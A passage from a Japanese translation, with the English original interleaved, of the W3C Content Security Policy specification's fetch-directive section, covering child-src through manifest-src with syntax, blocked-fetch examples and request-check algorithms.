］両~指令
◎
Both the script-src and object-src directives, or
</li>
	<li>
`default-src$dir 指令
◎
a default-src directive
</li>
</ul>

<p>
いずれの場合も、~web開発者は，自身による施策~内に妥当な~sourceとして
`unsafe-inline$pl ／ `data_^sc
を含ませる~SHOULDでない。
両者とも，［
文書~自身~内に~codeを直に含めることを許容する
］ため，~XSS攻撃を可能化するので。
それらは完全に避けるのが最善である。
◎
In either case, developers SHOULD NOT include either 'unsafe-inline', or data: as valid sources in their policies. Both enable XSS attacks by allowing code to be included directly in the document itself; they are best avoided completely.
</p>



		<section id="directives-fetch">
<h3 title="Fetch Directives">6.1. ~fetch指令</h3>

<p>
この節の各~下位~節に~~述べる指令は、
`~fetch指令@
と総称される。
`~fetch指令$は、ある種の型の資源を，どの所在から読込んでよいかを制御する。
例えば、 `script-src$dir 指令は，~web開発者が信用する~sourceからの~scriptを許容して，~page上で実行できるようにする。
また、 `font-src$dir 指令は，~web~fontの~sourceを制御する。
◎
Fetch directives control the locations from which certain resource types may be loaded. For instance, script-src allows developers to allow trusted sources of script to execute on a page, while font-src controls the sources of web fonts.
</p>

			<section id="directive-child-src">
<h4>6.1.1. `child-src^dir</h4>

<p>
`child-src@dir
指令は、［
`入子の閲覧文脈$（例： `iframe$e ／ `frame$e ~navi ） ／
`Worker^I 実行~文脈
］の作成を統治する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The child-src directive governs the creation of nested browsing contexts (e.g. iframe and frame navigations) and Worker execution contexts. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "child-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
この指令は、［
~frame／~worker
］を拡充するような`要請$
— 公式的には，次に該当する`要請$ —
を制御する：
◎
This directive controls requests which will populate a frame or a worker. More formally, requests falling into one of the following categories:
</p>

<ul>
	<li>
［
`行先$rq ~EQ `document^l
］~AND［
その`~target閲覧文脈$rqは `入子の閲覧文脈$である
］
（例：
`iframe$e ／ `frame$e
要素を拡充するような要請）。
◎
destination is "document", and whose target browsing context is a nested browsing context (e.g. requests which will populate an iframe or frame element)
</li>
	<li>
`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
（順に，［
`ServiceWorker$I,
`SharedWorker$I,
`Worker$I
］に対する，`~workerを走らす$~algoに投入される）。
◎
destination is either "serviceworker", "sharedworker", or "worker" (which are fed to the run a worker algorithm for ServiceWorker, SharedWorker, and Worker, respectively).
</li>
</ul>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `child-src$dir https://example.com/
</pre>

<p>
次の~codeによる どの~fetchも，~network~errorを返す
— 供された~URLは，どれも
`child-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will all return network errors, as the URLs provided do not match child-src's source list:
</p>

<pre class="html-code">
&lt;iframe src="https://example.org"&gt;&lt;/iframe&gt;
&lt;script&gt;
  var %blockedWorker = new Worker("data:application/javascript,...");
&lt;/script&gt;
</pre>

</div>


				<section id="child-src-pre-request">
<h5 title="child-src Pre-request check">6.1.1.1. `child-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>


<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.11 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~NIN { `frame-src^l, `worker-src^l }
］
⇒
~RET `許容ed^i
◎
If name is not frame-src or worker-src, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed".
</li>
	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請前~検査$A
］( %要請, %施策 )
を実行した結果
◎
Return the result of executing the pre-request check for the directive whose name is name on request and policy, using this directive’s value for the comparison.

</li>
</ol>


				</section>
				<section id="child-src-post-request">
<h5 title="child-src Post-request check">6.1.1.2. `child-src^dir 要請後~検査</h5>


<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.11 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~NIN { `frame-src^l, `worker-src^l }
］
⇒
~RET `許容ed^i
◎
If name is not frame-src or worker-src, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed"
</li>
	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請後~検査$A
］( %要請, %応答, %施策 )
を実行した結果
◎
Return the result of executing the post-request check for the directive whose name is name on request, response, and policy, using this directive’s value for the comparison.
</li>
</ol>


				</section>
			</section>
			<section id="directive-connect-src">
<h4>6.1.2. `connect-src^dir</h4>

<p>
`connect-src@dir
指令は、［
~script~interfaceを利用して読込める~URL
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The connect-src directive restricts the URLs which can be loaded using script interfaces. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "connect-src"
`directive-value$p = `serialized-source-list$p
</pre>


<p>
この指令は、~dataを他の生成元［
へ伝送する／から受信する
］ような`要請$を制御する。
それらには、次の~APIが含まれる：［
`fetch()$m,
`XHR$r,
`EVENTSOURCE$r,
`BEACON$r,
`a$e 要素の `ping$m 属性
］。
この指令は<em>また</em>、 `WEBSOCKETS$r 接続も制御する
— それは技術的には~Fetchの一部ではないが。
◎
This directive controls requests which transmit or receive data from other origins. This includes APIs like fetch(), [XHR], [EVENTSOURCE], [BEACON], and a's ping. This directive also controls WebSocket [WEBSOCKETS] connections, though those aren’t technically part of Fetch.
</p>

<div class="example">

<div class="p">
<p>
~JSは、［
情報を送受信するために外部~serverへ直に接続する
］ための，少数の仕組みを提供する：
</p>

<ul ><li>`EventSource$I は、~push通知を受信するために，~serverへ開いた~HTTP接続を保守する。
</li><li>`WebSocket$I は、~browser↔~server間で，双方向通信channelを開く。
</li><li>`XMLHttpRequest$I は、任意の~HTTP要請を，~web開発者に利するために発行する。
</li></ul>

<p>
これらは，有用な機能性を可能化する強力な~APIだが、
`exfiltration^en
【 “フィルタを超える” — 内部から外へ秘密裏に~dataを転送する】
へ誘う道も供する。
</p>
◎
JavaScript offers a few mechanisms that directly connect to an external server to send or receive information. EventSource maintains an open HTTP connection to a server in order to receive push notifications, WebSockets open a bidirectional communication channel between your browser and a server, and XMLHttpRequest makes arbitrary HTTP requests on your behalf. These are powerful APIs that enable useful functionality, but also provide tempting avenues for data exfiltration.
</div>


<p>
`connect-src$dir
指令は、［
これらの類の接続は，~web開発者が信用する生成元に限って開かれる
］ことを確保できるようにする。
［
この指令に対する~source式の~listを定義する施策
］の送信は、簡単である。
例えば，接続を
`https://example.com^s
のみに制限するときは、次の~headerを送信する：
◎
The connect-src directive allows you to ensure that these and similar sorts of connections are only opened to origins you trust. Sending a policy that defines a list of source expressions for this directive is straightforward. For example, to limit connections to only https://example.com, send the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `connect-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，いずれも~network~errorを返すことになる
— 供された~URLは，どれも
`connect-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will all return network errors, as the URLs provided do not match connect-src's source list:
</p>

<pre class="html-code">
&lt;a ping="https://example.org"&gt;...
&lt;script&gt;
  var %xhr = new XMLHttpRequest();
  %xhr.open('GET', 'https://example.org/');
  %xhr.send();

  var %ws = new WebSocket("https://example.org/");

  var %es = new EventSource("https://example.org/");

  navigator.sendBeacon("https://example.org/", { ... });
&lt;/script&gt;
</pre>
</div>



				<section id="connect-src-pre-request">
<h5 title="connect-src Pre-request check">6.1.2.1. `connect-src^dir 要請前~検査</h5>


<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`起動元$rq ~EQ `fetch^l
］~OR［
%要請 の`行先$rq ~EQ 空~文字列
］：
◎
If request’s initiator is "fetch" or its destination is "":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="connect-src-post-request">
<h5 title="connect-src Post-request check">6.1.2.2. `connect-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`起動元$rq ~EQ `fetch^l
］~OR［
%要請 の`行先$rq ~EQ 空~文字列
］：
◎
If request’s initiator is "fetch" or its destination is "":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-default-src">
<h4>6.1.3. `default-src^dir</h4>

<p>
`default-src@dir
指令は、他の`~fetch指令$に対する~fallbackとして~~働く。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The default-src directive serves as a fallback for the other fetch directives. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "default-src"
`directive-value$p = `serialized-source-list$p
</pre>


<p>
施策~内に `default-src$dir 指令が在する場合、その値は，施策の既定の`~source~list$として利用されることになる。
すなわち、
`default-src 'none'; script-src 'self'^s
が与えられたなら、~script要請は，照合する`~source~list$として，
`self$pl を利用する。
他の要請は， `none$pl を利用することになる。
これは、［
`要請は~CSPにより阻止されるべきか？$A,
`要請に対する応答は~CSPにより阻止されるべきか？$A
］~algoにてより詳細に~~述べられる。
◎
If a default-src directive is present in a policy, its value will be used as the policy’s default source list. That is, given default-src 'none'; script-src 'self', script requests will use 'self' as the source list to match against. Other requests will use 'none'. This is spelled out in more detail in the §4.1.3 Should request be blocked by Content Security Policy? and §4.1.4 Should response to request be blocked by Content Security Policy? algorithms.
</p>

<div class="example">

<p>
次の~headerは：
◎
The following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `default-src$dir `self$pl
</pre>

<p>
次の~headerと同じ挙動になる：
◎
will have the same behavior as the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `connect-src$dir `self$pl;
    `font-src$dir `self$pl;
    `frame-src$dir `self$pl;
    `img-src$dir `self$pl;
    `manifest-src$dir `self$pl;
    `media-src$dir `self$pl;
    `prefetch-src$dir `self$pl;
    `object-src$dir `self$pl;
    `script-src$dir `self$pl;
    `style-src$dir `self$pl;
    `worker-src$dir `self$pl
</pre>

<p>
すなわち、 `default-src$dir が設定されているときは，明示的に設定されていない どの`~fetch指令$も， `default-src$dir が指定する値に~fall-backすることになる。
◎
That is, when default-src is set, every fetch directive that isn’t explicitly set will fall back to the value default-src specifies.
</p>
</div>

<div class="example">

<p>
継承はない。
例えば， `script-src$dir 指令が明示的に指定されている場合、
`default-src$dir の値は
~script要請には波及しない。
すなわち、次の~headerは：
◎
There is no inheritance. If a script-src directive is explicitly specified, for example, then the value of default-src has no influence on script requests. That is, the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `default-src$dir `self$pl;
    `script-src$dir https://example.com
</pre>

<p>
次の~headerと同じ挙動になる：
◎
will have the same behavior as the following header:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `connect-src$dir `self$pl;
    `font-src$dir `self$pl;
    `frame-src$dir `self$pl;
    `img-src$dir `self$pl;
    `manifest-src$dir `self$pl;
    `media-src$dir `self$pl;
    `prefetch-src$dir `self$pl;
    `object-src$dir `self$pl;
    `script-src$dir https://example.com;
    `style-src$dir `self$pl;
    `worker-src$dir `self$pl
</pre>


<p>
この挙動の下で，~siteのために施策を築く良い仕方の一つは、まず， `default-src$dir を `none$pl にする所から始め、［
施策が適用される特定0の~pageに必要とされる資源~型
］のみが許容されるように，施策を築上げるものになるであろう。
◎
Given this behavior, one good way to build a policy for a site would be to begin with a default-src of 'none', and to build up a policy from there which allowed only those resource types which are necessary for the particular page the policy will apply to.
</p>
</div>



				<section id="default-src-pre-request">
<h5 title="default-src Pre-request check">6.1.3.1. `default-src^dir 要請前~検査</h5>


<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.11 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~EQ ~NULL
］
⇒
~RET `許容ed^i
◎
If name is null, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed".
</li>
	<li>
~IF［
%名前 ~EQ `frame-src^l
］~AND［
%施策 内に［
`名前$ ~EQ `child-src^l
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If name is "frame-src", and policy contains a directive whose name is "child-src", return "Allowed".
</li>
	<li>
~IF［
%名前 ~EQ `worker-src^l
］~AND［
%施策 内に［
`名前$ ~IN { `script-src^l, `child-src^l }
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If name is "worker-src", and policy contains a directive whose name is "script-src" or a directive whose name is "child-src" , return "Allowed".
</li>
	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請前~検査$A
］( %要請, %施策 )
を実行した結果
◎
Otherwise, return the result of executing the pre-request check for the directive whose name is name on request and policy, using this directive’s value for the comparison.
</li>
</ol>


				</section>
				<section id="default-src-post-request">
<h5 title="default-src Post-request check">6.1.3.2. `default-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
%名前 ~LET %要請 に対する`有効な指令を取得-$Aした結果
◎
Let name be the result of executing §6.6.1.11 Get the effective directive for request on request.
</li>
	<li>
~IF［
%名前 ~EQ ~NULL
］
⇒
~RET `許容ed^i
◎
If name is null, return "Allowed".
</li>
	<li>
~IF［
%施策 内に［
`名前$ ~EQ %名前
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If policy contains a directive whose name is name, return "Allowed".
</li>
	<li>
~IF［
%名前 ~EQ `frame-src^l
］~AND［
%施策 内に［
`名前$ ~EQ `child-src^l
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If name is "frame-src", and policy contains a directive whose name is "child-src", return "Allowed".
</li>
	<li>
~IF［
%名前 ~EQ `worker-src^l
］~AND［
%施策 内に［
`名前$ ~IN { `script-src^l, `child-src^l }
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If name is "worker-src", and policy contains a directive whose name is "script-src" or a directive whose name is "child-src" , return "Allowed".
</li>
	<li>
~RET ［
`指令$( %名前, この指令の値 ) の`要請後~検査$A
］( %要請, %応答, %施策 )
を実行した結果
◎
Otherwise, return the result of executing the post-request check for the directive whose name is name on request, response, and policy, using this directive’s value for the comparison.
</li>
</ol>

				</section>
			</section>
			<section id="directive-font-src">
<h4>6.1.4. `font-src^dir</h4>

<p>
`font-src@dir
指令は、［
どの~URLから~font資源を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The font-src directive restricts the URLs from which font resources may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "font-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">
<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `font-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`font-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match font-src's source list:
</p>

<pre class="html-code">
&lt;style&gt;
  @font-face {
    font-family: "Example Font";
    src: url("https://example.org/font");
  }
  body {
    font-family: "Example Font";
  }
&lt;/style&gt;
</pre>
</div>



				<section id="font-src-pre-request">
<h5 title="font-src Pre-request check">6.1.4.1. `font-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `font^l
］：
◎
If request’s destination is "font":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="font-src-post-request">
<h5 title="font-src Post-request check">6.1.4.2. `font-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `font^l
］：
◎
If request’s destination is "font":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-frame-src">
<h4>6.1.5. `frame-src^dir</h4>

<p>
`frame-src@dir
指令は、［
どの~URLを`入子の閲覧文脈$内に読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The frame-src directive restricts the URLs which may be loaded into nested browsing contexts. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "frame-src"
`directive-value$p = `serialized-source-list$p
</pre>


<div class="example">
<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `frame-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは、~network~errorを返すことになる
— 供された~URLは，
`frame-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match frame-src's source list:
</p>

<pre class="html-code">
&lt;iframe src="https://example.org/"&gt;
&lt;/iframe&gt;
</pre>
</div>


				<section id="frame-src-pre-request">
<h5 title="frame-src Pre-request check">6.1.5.1. `frame-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `document^l
］~AND［
%要請 の`~target閲覧文脈$rqは`入子の閲覧文脈$である
］：
◎
If request’s destination is "document" and target browsing context is a nested browsing context:
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="frame-src-post-request">
<h5 title="frame-src Post-request check">6.1.5.2. `frame-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>


<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `document^l
］~AND［
%要請 の`~target閲覧文脈$rqは`入子の閲覧文脈$である
］：
◎
If request’s destination is "document" and target browsing context is a nested browsing context:
</p>

		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>



				</section>
			</section>
			<section id="directive-img-src">
<h4>6.1.6. `img-src^dir</h4>

<p>
`img-src@dir
指令は、［
どの~URLから画像~資源を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The img-src directive restricts the URLs from which image resources may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "img-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
この指令は、画像を読込む`要請$
— 公式的には，次に該当する`要請$ —
を制御する
`FETCH$r
⇒
`行先$rq ~EQ `image^l
◎
This directive controls requests which load images. More formally, this includes requests whose destination is "image" [FETCH].
</p>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `img-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは、~network~errorを返すことになる
— 供された~URLは，
`img-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match img-src's source list:
</p>

<pre class="html-code">
&lt;img src="https://example.org/img"&gt;
</pre>
</div>


				<section id="img-src-pre-request">
<h5 title="img-src Pre-request check">6.1.6.1. `img-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `image^l
］：
◎
If request’s destination is "image":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="img-src-post-request">
<h5 title="img-src Post-request check">6.1.6.2. `img-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `image^l
］：
◎
If request’s destination is "image":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-manifest-src">
<h4>6.1.7. `manifest-src^dir</h4>

<p>
`manifest-src@dir
指令は、［
~app~manifest `APPMANIFEST$r を読込んでもよい URL
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The manifest-src directive restricts the URLs from which application manifests may be loaded [APPMANIFEST]. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "manifest-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">
<p >
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `manifest-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`manifest-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match manifest-src's source list:
</p>

<pre class="html-code">
&lt;link rel="manifest" href="https://example.org/manifest"&gt;
</pre>

</div>

				<section id="manifest-src-pre-request">
<h5 title="manifest-src Pre-request check">6.1.7.1. `manifest-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `manifest^l
］：
◎
If request’s destination is "manifest":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="manifest-src-post-request">
<h5 title="manifest-src Post-request check">6.1.7.2. `manifest-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `manifest^l
］：
◎
If request’s destination is "manifest":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-media-src">
<h4>6.1.8. `media-src^dir</h4>

<p>
`media-src@dir
指令は、［
どの~URLから［
動画, 音声, および
結付けられている~text~track
］資源を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The media-src directive restricts the URLs from which video, audio, and associated text track resources may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "media-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `media-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`media-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match media-src's source list:
</p>

<pre class="html-code">
&lt;audio src="https://example.org/audio"&gt;&lt;/audio&gt;
&lt;video src="https://example.org/video"&gt;
    &lt;track kind="subtitles" src="https://example.org/subtitles"&gt;
&lt;/video&gt;
</pre>
</div>



				<section id="media-src-pre-request">
<h5 title="media-src Pre-request check">6.1.8.1. `media-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
